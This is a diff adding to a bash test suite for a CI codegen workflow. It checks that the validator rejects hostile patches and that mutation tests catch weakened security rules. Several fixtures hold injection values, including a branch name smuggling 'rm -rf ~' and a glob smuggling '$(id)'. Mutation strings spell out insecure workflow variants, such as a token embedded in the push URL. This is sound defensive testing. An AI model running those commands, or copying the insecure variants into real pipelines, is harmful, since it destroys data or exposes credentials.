+    git -C "$R" add -A && git -C "$R" commit -qm "chore(deps): monthly lockfile refresh 2026-11"
+    cg_blank "$R" "apps/mobile/lib/graphql/__generated__x/foo.gql.dart"; cg_snap "$R"
+    cgv "$R" reject "a look-alike directory" "__generated__x/foo.gql.dart is outside the generated-file paths"
+    R="$CGW/v-oddpath"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
+    printf 'a\n' > "$R/$CG_GEN/we ird.gql.dart"; git -C "$R" add -A && git -C "$R" commit -qm "chore(deps): monthly lockfile refresh 2026-11"
+    cg_blank "$R" "$CG_GEN/we ird.gql.dart"; cg_snap "$R"
+    cgv "$R" reject "a path with a space" "unusual path"
+    R="$CGW/v-branch"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
+    cg_blank "$R" "$CG_REQ"; cg_snap "$R"
+    cgv "$R" reject "branch main" "head branch 'main' is not a deps-cadence branch" main
+    cgv "$R" reject "a branch with shell metacharacters" "is not a deps-cadence branch" 'chore/deps-2026-11;rm -rf ~'
+    cgv "$R" reject "month 13" "is not a deps-cadence branch" chore/deps-2026-13
+    R="$CGW/v-loop"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
+    cg_blank "$R" "$CG_REQ"; git -C "$R" add -A && git -C "$R" commit -qm "$SUBJ"
+    cg_blank "$R" "$CG_G"; cg_snap "$R"
+    cgv "$R" reject "the LOOP BREAKER (a second codegen commit)" "refusing to push again"
+    R="$CGW/v-empty"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
+    mkdir -p "$R.rt/codegen-in"; : > "$R.rt/codegen-in/codegen.patch"
+    cgv "$R" reject "an empty artifact" "the artifact holds no patch"
+    # The deny list holds when the globs are widened, and the globs themselves are checked.
+    R="$CGW/v-widen"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
+    echo "  evil: 1.0.0" >> "$R/apps/mobile/pubspec.lock"; echo "dependencies: {evil: any}" >> "$R/apps/mobile/pubspec.yaml"; cg_snap "$R"
+    cgv "$R" reject "a lockfile under a widened glob" "is a workflow, manifest or lockfile" chore/deps-2026-11 "apps/mobile/*.lock apps/mobile/*.yaml"
+    cgv "$R" reject "a hostile glob" "is not a plain path glob" chore/deps-2026-11 'apps/$(id)/*.dart'
+    cgv "$R" reject "an empty glob list" "CODEGEN_GLOBS is empty" chore/deps-2026-11 ""
+
+    # ── glob-to-re ──
+    cg_glob 'a/*.dart' a/x.dart y
+    cg_glob 'a/*.dart' a/b/x.dart n
+    cg_glob 'a/*.dart' a/xdart n
+    cg_glob 'a/x.dart' a/xXdart n
+    cg_glob 'a/**/*.dart' a/x.dart y
+    cg_glob 'a/**/*.dart' a/b/c/x.dart y
+    cg_glob 'a/**/*.dart' b/a/x.dart n
+    cg_glob 'a/?.dart' a/b.dart y
+    cg_glob 'a/?.dart' a/bb.dart n
+    cg_glob 'a/c++.dart' a/c++.dart y
+    cg_glob 'a/c++.dart' a/c.dart n
+    cg_glob 'a/@x/y.dart' a/@x/y.dart y
+    cg_glob 'a/*.dart' 'a/x.dart.evil' n
+
+    # ── classify-codegen-diff ──
+    R="$CGW/c-blank"; rm -rf "$R" "$R.rt" "$R.out"; cg_lock_repo "$R"
+    printf '// GENERATED\n\nimport "a.dart";\n' > "$R/$CG_REQ"; git -C "$R" add -A && git -C "$R" commit -qm "seed an empty line to remove"
+    cg_blank "$R" "$CG_G"; cg_blank "$R" "$CG_MOCKS"; printf '// GENERATED\nimport "a.dart";\n' > "$R/$CG_REQ"; git -C "$R" add -A
+    cg_classify "$R" || cg_fail "empty-lines-only: classify exited non-zero"
+    [ "$CLS_OUT" = false ] || cg_fail "adding and removing EMPTY lines was classified '$CLS_OUT', wanted false (auto-merge stays armed)"
+    [ ! -e "$R.rt/codegen-review.md" ] || cg_fail "a review body was written for an empty-lines-only change"
+
+    R="$CGW/c-strws"; rm -rf "$R" "$R.rt" "$R.out"; cg_seed_strings "$R"
+    sed -i.bak 's/query Weather { forecast/query Weather {  forecast/' "$R/$CG_REQ" && rm -f "$R/$CG_REQ.bak"; git -C "$R" add -A
+    cg_sub "whitespace inside a string literal (the -w bypass)" "$R"
+    [ -z "$(git -C "$R" diff --cached -w --ignore-blank-lines)" ] || cg_fail "the -w bypass fixture is not a bypass (git -w sees a change), so the case proves nothing"
+    R="$CGW/c-spaces"; rm -rf "$R" "$R.rt" "$R.out"; cg_seed_strings "$R"; printf '    \n' >> "$R/$CG_REQ"; git -C "$R" add -A
+    cg_sub "a spaces-only line" "$R"
+    R="$CGW/c-tab"; rm -rf "$R" "$R.rt" "$R.out"; cg_seed_strings "$R"; printf '\t\n' >> "$R/$CG_REQ"; git -C "$R" add -A
+    cg_sub "a tab-only line" "$R"
+    R="$CGW/c-reorder"; rm -rf "$R" "$R.rt" "$R.out"; cg_seed_strings "$R"
+    printf 'const document = "query Weather { forecast(city: \\"x\\") { temp } }";\nconst url = "https://api.example.com/graphql";\nfinal b = 2;\nfinal a = 1;\n' > "$R/$CG_REQ"; git -C "$R" add -A
+    cg_sub "reordered lines" "$R"
+    R="$CGW/c-crlf"; rm -rf "$R" "$R.rt" "$R.out"; cg_seed_strings "$R"
+    printf 'const document = "query Weather { forecast(city: \\"x\\") { temp } }";\r\nconst url = "https://api.example.com/graphql";\nfinal a = 1;\nfinal b = 2;\n' > "$R/$CG_REQ"; git -C "$R" add -A
+    git -C "$R" diff --cached --quiet && cg_fail "the CRLF fixture staged nothing"
+    cg_sub "CRLF on one line" "$R"
+    R="$CGW/c-lonecr"; rm -rf "$R" "$R.rt" "$R.out"; cg_lock_repo "$R"
+    printf '// GENERATED\n\nimport "a.dart";\n' > "$R/$CG_REQ"; git -C "$R" add -A && git -C "$R" commit -qm "seed an empty line"
+    printf '// GENERATED\n\r\nimport "a.dart";\n' > "$R/$CG_REQ"; git -C "$R" add -A
+    git -C "$R" diff --cached --quiet && cg_fail "the lone-CR fixture staged nothing"
+    cg_sub "an empty line that becomes a lone CR" "$R"
+    R="$CGW/c-nonl"; rm -rf "$R" "$R.rt" "$R.out"; cg_seed_strings "$R"
+    printf 'const document = "query Weather { forecast(city: \\"x\\") { temp } }";\nconst url = "https://api.example.com/graphql";\nfinal a = 1;\nfinal b = 2;\n\n' > "$R/$CG_REQ"
+    git -C "$R" add -A && git -C "$R" commit -qm "seed trailing empty line"
+    printf 'const document = "query Weather { forecast(city: \\"x\\") { temp } }";\nconst url = "https://api.example.com/graphql";\nfinal a = 1;\nfinal b = 2;' > "$R/$CG_REQ"; git -C "$R" add -A
+    cg_sub "a missing trailing newline (\\ No newline)" "$R"
+    R="$CGW/c-mode"; rm -rf "$R" "$R.rt" "$R.out"; cg_lock_repo "$R"
+    cg_blank "$R" "$CG_REQ"; chmod +x "$R/$CG_G"; git -C "$R" add -A
+    cg_sub "a mode change beside empty lines" "$R"
+    R="$CGW/c-emptydiff"; rm -rf "$R" "$R.rt" "$R.out"; cg_lock_repo "$R"
+    cg_sub "an empty diff" "$R"
+    # Canned diff text through a git stub: the verdict comes from the parse.
+    local gs="$CGW/gitstub" realgit body
+    realgit="$(command -v git)"; mkdir -p "$gs"
+    cat > "$gs/git" <<STUBEOF
+#!/usr/bin/env bash
+for a in "\$@"; do
+  if [ "\$a" = "--unified=0" ]; then cat "\$CANNED_DIFF"; exit 0; fi
+done
+exec "$realgit" "\$@"
+STUBEOF
+    chmod +x "$gs/git"
+    cg_canned() { # <name> <diff text>
+        R="$CGW/c-canned-$1"; rm -rf "$R" "$R.rt" "$R.out"; cg_lock_repo "$R"
+        cg_blank "$R" "$CG_REQ"; git -C "$R" add -A
+        printf '%b' "$2" > "$CGW/canned-$1.diff"
+        cg_classify "$R" PATH="$gs:$PATH" CANNED_DIFF="$CGW/canned-$1.diff" || cg_fail "canned $1: classify exited non-zero"
+        [ "$CLS_OUT" = true ] || cg_fail "canned $1: classified '$CLS_OUT', wanted substantive=true"
+    }
+    cg_canned garbage 'this is not a diff\n+\n'
+    cg_canned plus-without-hunk 'diff --git a/x b/x\nindex 1..2 100644\n--- a/x\n+++ b/x\n+\n'
+    cg_canned hunk-without-file '@@ -1,0 +2 @@\n+\n'
+    cg_canned context-line 'diff --git a/x b/x\nindex 1..2 100644\n--- a/x\n+++ b/x\n@@ -1,0 +2 @@\n \n+\n'
+    cg_canned binary 'diff --git a/x b/x\nindex 1..2 100644\nBinary files a/x and b/x differ\n'
+    cg_canned empty ''
+    cg_canned headers-only 'diff --git a/x b/x\nindex 1111111..2222222 100644\n--- a/x\n+++ b/x\n'
+    cg_canned hunk-without-changes 'diff --git a/x b/x\nindex 1111111..2222222 100644\n--- a/x\n+++ b/x\n@@ -1,0 +1,0 @@\n'
+    cg_canned mode-header 'diff --git a/x b/x\nold mode 100644\nnew mode 100755\n@@ -1,0 +2 @@\n+\n'
+    cg_canned no-newline-marker 'diff --git a/x b/x\nindex 1111111..2222222 100644\n--- a/x\n+++ b/x\n@@ -1,0 +2 @@\n+\n\\\\ No newline at end of file\n'
+    R="$CGW/c-canned-ok"; rm -rf "$R" "$R.rt" "$R.out"; cg_lock_repo "$R"; cg_blank "$R" "$CG_REQ"; git -C "$R" add -A
+    printf 'diff --git a/x b/x\nindex 1111111..2222222 100644\n--- a/x\n+++ b/x\n@@ -1,0 +2 @@\n+\n@@ -5 +5,0 @@\n-\n' > "$CGW/canned-ok.diff"
+    cg_classify "$R" PATH="$gs:$PATH" CANNED_DIFF="$CGW/canned-ok.diff" || cg_fail "canned valid: classify exited non-zero"
+    [ "$CLS_OUT" = false ] || cg_fail "the stub with a VALID empty-lines diff classified '$CLS_OUT', so the canned rejections prove nothing"
+    # An error is substantive.
+    R="$CGW/c-err"; rm -rf "$R" "$R.rt" "$R.out"; cg_lock_repo "$R"; cg_blank "$R" "$CG_REQ"; git -C "$R" add -A
+    cg_classify "$R" GIT_DIR="$CGW/does-not-exist" || cg_fail "an error: classify exited non-zero (it must always exit 0)"
+    [ "$CLS_OUT" = true ] || cg_fail "a classification ERROR was '$CLS_OUT', wanted substantive=true (fail closed)"
+    grep -qF "classification failed" "$CGW/out" || cg_fail "the error reason is not named"
+    # The review body of a substantive change.
+    R="$CGW/c-body"; rm -rf "$R" "$R.rt" "$R.out"; cg_lock_repo "$R"
+    printf 'const injected = 1;\n' >> "$R/$CG_REQ"; cg_blank "$R" "$CG_MOCKS"
+    git -C "$R" add -A && git -C "$R" commit -qm "chore(deps): an earlier generated edit" -q
+    printf 'const injected = 2;\n' >> "$R/$CG_REQ"; git -C "$R" add -A
+    cg_sub "new generated code" "$R"
+    body="$(cat "$R.rt/codegen-review.md" 2>/dev/null)"
+    for name in "needs a human review" 'auto-merge has been **disabled**' "$CG_REQ" 'gh pr merge --auto 2401' '```diff'; do
+        grep -qF -- "$name" <<<"$body" || cg_fail "the review body lacks: $name"
+    done
+    grep -qF -- "$CG_MOCKS" <<<"$body" && cg_fail "the review body lists a file that is not staged"
+    R="$CGW/c-body2"; rm -rf "$R" "$R.rt" "$R.out"; cg_lock_repo "$R"
+    printf 'const injected = 1;\n' >> "$R/$CG_REQ"; git -C "$R" add -A
+    cg_sub "new generated code over a moved lockfile" "$R"
+    body="$(cat "$R.rt/codegen-review.md" 2>/dev/null)"
+    for name in '-    version: "4.11.1"' '+    version: "4.12.0"'; do
+        grep -qF -- "$name" <<<"$body" || cg_fail "the review body does not show the lockfile change: $name"
+    done
+
+    # ── push-codegen ──
+    cg_stub
+    cg_push_repo push-ws false true; cg_run_push false || cg_fail "not substantive: the push step failed: $(tail -n1 "$CGW/out")"
+    [ "$(cg_remote_head)" = "$(git -C "$PR_R" rev-parse HEAD)" ] || cg_fail "not substantive: the remote branch did not advance"
+    [ "$(git -C "$PR_R" log -1 --format='%an <%ae>')" = "$CG_BOT <4242+$CG_BOT@users.noreply.github.com>" ] \
+        || cg_fail "the commit is not authored by the App bot"
+    [ "$(git -C "$PR_R" log -1 --format=%s)" = "$SUBJ" ] || cg_fail "the commit subject is not the codegen subject"
+    ! cg_called 'pr merge' || cg_fail "not substantive: auto-merge was disabled anyway"
+    ! cg_called 'pr comment' || cg_fail "not substantive: a review comment was posted anyway"
+    [ "$(cat "$GHS/armed")" = true ] || cg_fail "not substantive: auto-merge is no longer armed"
+
+    cg_push_repo push-sub false true; printf 'REVIEW BODY\n' > "$PR_R.rt/codegen-review.md"
+    cg_run_push true || cg_fail "substantive: the push step failed: $(tail -n1 "$CGW/out")"
+    cg_called 'pr merge --disable-auto 2401' || cg_fail "substantive: auto-merge was not disabled"
+    [ "$(cat "$GHS/remote_at_disable" 2>/dev/null)" = "$OLD_HEAD" ] || cg_fail "substantive: auto-merge was not disarmed BEFORE the push"
+    [ "$(cg_remote_head)" = "$(git -C "$PR_R" rev-parse HEAD)" ] || cg_fail "substantive: the commit was not pushed after disarming"
+    grep -qx 'REVIEW BODY' "$GHS/comment" 2>/dev/null || cg_fail "substantive: the classifier's review body was not posted"
+
+    cg_push_repo push-unset false true; cg_run_push UNSET || cg_fail "no classification output: the push step failed"
+    cg_called 'pr merge --disable-auto' || cg_fail "a missing classification was not treated as substantive"
+    grep -qF 'needs a human review' "$GHS/comment" 2>/dev/null || cg_fail "no fallback review comment for a missing classification"
+    cg_push_repo push-garbage false true; cg_run_push maybe || cg_fail "a garbage classification: the push step failed"
+    cg_called 'pr merge --disable-auto' || cg_fail "a classification other than an explicit false was not treated as substantive"
+
+    cg_push_repo push-queued true false; cg_run_push true || cg_fail "queued: the push step failed: $(tail -n1 "$CGW/out")"
+    cg_called dequeuePullRequest || cg_fail "substantive while queued: the PR was not dequeued"
+    [ "$(cg_remote_head)" = "$(git -C "$PR_R" rev-parse HEAD)" ] || cg_fail "substantive while queued: not pushed after dequeuing"
+
+    cg_push_repo push-faildisarm false true; touch "$GHS/fail_disable"
+    if cg_run_push true; then cg_fail "a failed disarm did not fail the push step"; fi
+    grep -qF "not pushing substantive generated code to an armed PR" "$CGW/out" || cg_fail "a failed disarm does not name the refusal"
+    [ "$(cg_remote_head)" = "$OLD_HEAD" ] || cg_fail "a failed disarm still pushed"
+    ! cg_called 'pr comment' || cg_fail "a failed disarm still posted a comment"
+    return "$cg_rc"
+}
+
+echo "deps-cadence codegen:"
+[ -r "$CODEGEN" ] || { bad "missing template: $CODEGEN"; exit 1; }
+if out="$(cg_static "$CODEGEN" "$IMPL")"; then
+    ok "the codegen template holds every static rule (trigger and gates, no secret in regen, one late scoped mint, hooks off, token out of argv, fail closed, no -w)"
+else
+    while IFS= read -r l; do bad "$l"; done <<<"$out"
+fi
+if out="$(cg_exec "$CODEGEN")"; then
+    ok "the extracted blocks hold every executed rule (hostile patches, glob-to-re, the empty-line classifier, disarm-before-push)"
+else
+    while IFS= read -r l; do bad "$l"; done <<<"$out"
+fi
+
+# cgmutate <name> <static|exec|both> <from> <to> — LITERAL replacement in a copy.
+cgmutate() {
+    local name="$1" kind="$2" mt="$WORK/mut-codegen.yml"
+    FROM="$3" TO="$4" perl -0pe 's/\Q$ENV{FROM}\E/$ENV{TO}/g' "$CODEGEN" > "$mt"
+    if cmp -s "$mt" "$CODEGEN"; then bad "mutation ($name) changed nothing, so it proves nothing (template reworded?)"; return; fi
+    if [ "$kind" != exec ] && cg_static "$mt" "$IMPL" >/dev/null 2>&1; then bad "mutation ($name) PASSED the static check — the gate cannot catch it"; return; fi
+    if [ "$kind" = exec ] && cg_exec "$mt" >/dev/null 2>&1; then bad "mutation ($name) PASSED the executed check — the gate cannot catch it"; return; fi
+    ok "mutation ($name) fails the check"
+}
+cgmutate_impl() { # <name> <from> <to> — a mutation of the IMPL seen by the codegen static check
+    local mi="$WORK/mut-impl-cg.yml"
+    FROM="$2" TO="$3" perl -0pe 's/\Q$ENV{FROM}\E/$ENV{TO}/g' "$IMPL" > "$mi"
+    if cmp -s "$mi" "$IMPL"; then bad "mutation ($1) changed nothing, so it proves nothing"; return; fi
+    if cg_static "$CODEGEN" "$mi" >/dev/null 2>&1; then bad "mutation ($1) PASSED the check — the gate cannot catch it"; else ok "mutation ($1) fails the check"; fi
+}
+
+BOT_AUTHOR="github.event.pull_request.user.login == '$CG_BOT' &&"
+cgmutate "pull_request_target trigger" static $'on:\n  pull_request:' $'on:\n  pull_request_target:'
+cgmutate "regen drops the author gate" static "    if: >-
+      $BOT_AUTHOR
+      startsWith(github.event.pull_request.head.ref, 'chore/deps-') &&
+      github.event.pull_request.head.repo.full_name == github.repository
+    # Ephemeral" "    if: >-
+      startsWith(github.event.pull_request.head.ref, 'chore/deps-') &&
+      github.event.pull_request.head.repo.full_name == github.repository
+    # Ephemeral"
+cgmutate "push drops the sender gate" static "      github.event.sender.login == '$CG_BOT' &&"$'\n' ''
+cgmutate "push drops the head-repo gate" static $'      startsWith(github.event.pull_request.head.ref, \'chore/deps-\') &&\n      github.event.pull_request.head.repo.full_name == github.repository\n    runs-on: ubuntu-latest\n    timeout-minutes: 10' $'      startsWith(github.event.pull_request.head.ref, \'chore/deps-\')\n    runs-on: ubuntu-latest\n    timeout-minutes: 10'
+cgmutate "push runs when regen found nothing" static "      needs.regen.outputs.changed == 'true' &&"$'\n' ''
+cgmutate "secret in the regen job" static $'    outputs:\n      changed: ${{ steps.patch.outputs.changed }}' $'    outputs:\n      changed: ${{ steps.patch.outputs.changed }}\n    env:\n      KEY: ${{ secrets.PLATFORM_WRITER_APP_PRIVATE_KEY }}'
+CGMINT="$(sed -n '/^      - name: Mint GitHub App token$/,/^          permission-pull-requests: write$/p' "$CODEGEN")"
+cgmutate "App token minted in regen" static $'      - name: Regenerate\n' "$CGMINT"$'\n\n      - name: Regenerate\n'
+cgmutate "App token minted before validation" static $'      - name: Validate and apply the codegen patch\n' "$CGMINT"$'\n\n      - name: Validate and apply the codegen patch\n'
+cgmutate "mint without a repository scope" static $'          repositories: ${{ github.event.repository.name }}\n' ''
+cgmutate "mint asks for workflows write" static $'          permission-pull-requests: write\n' $'          permission-pull-requests: write\n          permission-workflows: write\n'
+cgmutate "GITHUB_TOKEN fallback" static 'GH_TOKEN: ${{ steps.app_token.outputs.token }}' 'GH_TOKEN: ${{ steps.app_token.outputs.token || secrets.GITHUB_TOKEN }}'
+cgmutate "built-in token granted write" static $'permissions:\n  contents: read\n\n# One run' $'permissions:\n  contents: write\n\n# One run'
+cgmutate "a package manager in push" static $'      - name: Classify the regenerated diff\n' $'      - name: Install\n        run: npm install\n\n      - name: Classify the regenerated diff\n'
+cgmutate "a third-party action in push" static $'      - name: Classify the regenerated diff\n' $'      - uses: octo-org/helper@v1\n\n      - name: Classify the regenerated diff\n'
+cgmutate "self-hosted runner" static $'    runs-on: ubuntu-latest\n    timeout-minutes: 30' $'    runs-on: [self-hosted, linux]\n    timeout-minutes: 30'
+cgmutate "checkout persists credentials" static $'          fetch-depth: 0\n          persist-credentials: false' $'          fetch-depth: 0'
+cgmutate "event value interpolated into a script" static $'          set -euo pipefail\n          bash -euo pipefail -c "$CODEGEN_COMMAND"' $'          set -euo pipefail\n          echo "${{ github.event.pull_request.head.ref }}"\n          bash -euo pipefail -c "$CODEGEN_COMMAND"'
+cgmutate "continue-on-error" static $'        id: classify\n' $'        id: classify\n        continue-on-error: true\n'
+cgmutate "token in the push URL" static $'git "${nohooks[@]}" -c credential.helper= \\\n            -c \'credential.helper=!f() { echo username=x-access-token; echo "password=$GH_TOKEN"; }; f\' \\\n            push "${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}.git"' 'git "${nohooks[@]}" push "https://x-access-token:${GH_TOKEN}@github.com/${GITHUB_REPOSITORY}.git"'
+cgmutate "token expanded into argv" static $'-c \'credential.helper=!f() { echo username=x-access-token; echo "password=$GH_TOKEN"; }; f\'' $'-c "credential.helper=!f() { echo username=x-access-token; echo password=$GH_TOKEN; }; f"'
+cgmutate "global git config honoured in push" static $'          export GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null\n          nohooks=(-c core.hooksPath=/dev/null -c core.fsmonitor=false)\n          # Fail closed' $'          nohooks=(-c core.hooksPath=/dev/null -c core.fsmonitor=false)\n          # Fail closed'
+cgmutate "hooks run on commit" static 'git "${nohooks[@]}" commit' 'git commit'
+cgmutate "hooks run on ls-files in the validator" static 'git "${nohooks[@]}" ls-files -s' 'git ls-files -s'
+cgmutate "classifier ignores whitespace (-w)" static 'diff --cached --unified=0 --no-color' 'diff --cached -w --unified=0 --no-color'
+cgmutate "classifier ignores blank lines" static 'diff --cached --unified=0 --no-color' 'diff --cached --ignore-blank-lines --unified=0 --no-color'
+cgmutate "classifier honours GIT_EXTERNAL_DIFF" static 'env -u GIT_EXTERNAL_DIFF -u GIT_DIFF_OPTS LC_ALL=C git "${nohooks[@]}" \'$'\n                -c color.ui=false' 'LC_ALL=C git "${nohooks[@]}" \'$'\n                -c color.ui=false'
+cgmutate "classifier defaults to auto-mergeable" static $'          substantive=true\n          reason="classification failed' $'          substantive=false\n          reason="classification failed'
+cgmutate "push defaults to auto-mergeable" static $'          substantive=true\n          [ "${SUBSTANTIVE:-}" = "false" ] && substantive=false' $'          substantive=false\n          [ "${SUBSTANTIVE:-}" = "true" ] && substantive=true'
+cgmutate "loop breaker removed" static 'refusing to push again' 'pushing again'
+cgmutate "globs read with an unquoted expansion" static 'read -r -a globs <<<"$CODEGEN_GLOBS"' 'globs=($CODEGEN_GLOBS)'
+cgmutate "deny list removed" static $'denied=\'^\\.git(hub)?/|' $'denied=\'^NEVER/|'
+cgmutate "flutter reader drifts from the impl's" static $'if ! [[ "$v" =~ ^[0-9]+\\.[0-9]+\\.[0-9]+$ ]]; then\n            echo "::error::$PIN_FILE does not pin an exact Flutter' $'if ! [[ "$v" =~ ^[0-9]+\\.[0-9]+(\\.[0-9]+)?$ ]]; then\n            echo "::error::$PIN_FILE does not pin an exact Flutter'
+cgmutate_impl "the impl's validator calls git ls-files without nohooks" 'git "${nohooks[@]}" ls-files -s' 'git ls-files -s'
+cgmutate_impl "the impl's commit loses nohooks" 'git "${nohooks[@]}" commit' 'git commit'
+# Executed rules.
+cgmutate "branch check removed" exec '[[ "$HEAD_REF" =~ ^chore/deps-[0-9]{4}-(0[1-9]|1[0-2])$ ]] \'$'\n            || reject' 'true \'$'\n            || reject'
+cgmutate "loop breaker never fires" exec '[ "$(git "${nohooks[@]}" log -1 --format=%s)" = "$CODEGEN_SUBJECT" ]' '[ "never" = "$CODEGEN_SUBJECT" ]'
+cgmutate "allowlist check removed" exec '[[ "$path" =~ $allowed ]] || reject "$path is outside the generated-file paths"' 'true'
+cgmutate "deny list check removed" exec 'if [[ "$path" =~ $denied ]]; then reject "$path is a workflow, manifest or lockfile"; fi' 'true'
+cgmutate "summary (create/delete/rename/mode) check removed" exec '[ -z "$summary" ] || reject' 'true || reject'
+cgmutate "binary check removed" exec '[ "$added" != "-" ] || reject "$path is a binary change; generated files are text"' 'true'
+cgmutate "odd-path check removed" exec 'if ! [[ "$path" =~ ^[A-Za-z0-9._/@+-]+$ ]] || [[ "$path" == *..* ]]; then' 'if false; then'
+cgmutate "regular-file check removed" exec $'[ "$mode" = "100644" ] || [ "$mode" = "100755" ] \\\n              || reject' $'true \\\n              || reject'
+cgmutate "glob dot not escaped" exec '[.+@]*) re+="\\${g:0:1}"; g="${g:1}" ;;' '[+@]*) re+="\\${g:0:1}"; g="${g:1}" ;;'
+cgmutate "** does not span directories" exec "'**/'*) re+='(.*/)?'; g=\"\${g#'**/'}\" ;;" "'**/'*) re+='[^/]*/'; g=\"\${g#'**/'}\" ;;"
+cgmutate "* spans directories" exec "'*'*)   re+='[^/]*';  g=\"\${g#'*'}\" ;;" "'*'*)   re+='.*';  g=\"\${g#'*'}\" ;;"
+cgmutate "globs read with an unquoted expansion (executed)" exec 'read -r -a globs <<<"$CODEGEN_GLOBS"' 'globs=($CODEGEN_GLOBS)'
+cgmutate "classifier accepts a spaces-only line" exec '/^@@ -[0-9]+(,[0-9]+)? \+[0-9]+(,[0-9]+)? @@/ && mode != "none" { mode = "hunk"; hunks++; next }'$'\n              mode == "hunk" && ($0 == "+" || $0 == "-") {' '/^@@ -[0-9]+(,[0-9]+)? \+[0-9]+(,[0-9]+)? @@/ && mode != "none" { mode = "hunk"; hunks++; next }'$'\n              mode == "hunk" && ($0 ~ /^[+-][[:space:]]*$/) {'
+cgmutate "classifier uses -w" exec 'diff --cached --unified=0 --no-color' 'diff --cached -w --unified=0 --no-color'
+cgmutate "classifier ignores context lines" exec 'mode == "hunk" && ($0 == "+" || $0 == "-") { changes++; next }' 'mode == "hunk" && ($0 == "+" || $0 == "-" || $0 ~ /^ /) { changes++; next }'
+cgmutate "classifier accepts an empty diff" exec 'if (!bad && hunks > 0 && changes > 0)' 'if (!bad)'
+cgmutate "classifier trusts a hunk-less file" exec '/^@@ -[0-9]+(,[0-9]+)? \+[0-9]+(,[0-9]+)? @@/ && mode != "none"' '/^@@ -[0-9]+(,[0-9]+)? \+[0-9]+(,[0-9]+)? @@/'
+cgmutate "classifier defaults to auto-mergeable (executed)" exec $'          substantive=true\n          reason="classification failed' $'          substantive=false\n          reason="classification failed'
+cgmutate "classifier forgets the error path" exec '--no-textconv --no-renames)"; then' '--no-textconv --no-renames || true)"; then'
+cgmutate "disarm skipped" exec 'gh pr merge --disable-auto "$PR_NUMBER" --repo "$GITHUB_REPOSITORY" \' 'true \'
+cgmutate "disarm failure ignored" exec 'if [ "$queued" != false ] || [ "$armed" != false ]; then' 'if false; then'
+cgmutate "dequeue skipped" exec 'if [ "$queued" = true ]; then' 'if false; then'
+cgmutate "push before the disarm" exec $'          # Substantive: disarm BEFORE pushing, so the new code is never on an\n          # armed PR, and push nothing if disarming fails.\n          if [ "$substantive" = true ]; then' $'          git "${nohooks[@]}" -c credential.helper= -c \'credential.helper=!f() { echo username=x-access-token; echo "password=$GH_TOKEN"; }; f\' push "${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}.git" "HEAD:refs/heads/${HEAD_REF}"\n          if [ "$substantive" = true ]; then'
+cgmutate "garbage classification stays armed" exec '[ "${SUBSTANTIVE:-}" = "false" ] && substantive=false' '[ "${SUBSTANTIVE:-}" != "true" ] && substantive=false'
+cgmutate "no review comment" exec 'gh pr comment "$PR_NUMBER" --repo "$GITHUB_REPOSITORY" --body-file "$body"' 'true'
+cgmutate "push commits as nobody" exec 'git config user.name "${APP_SLUG}[bot]"' 'git config user.name "someone"'
 
 exit "$fail"
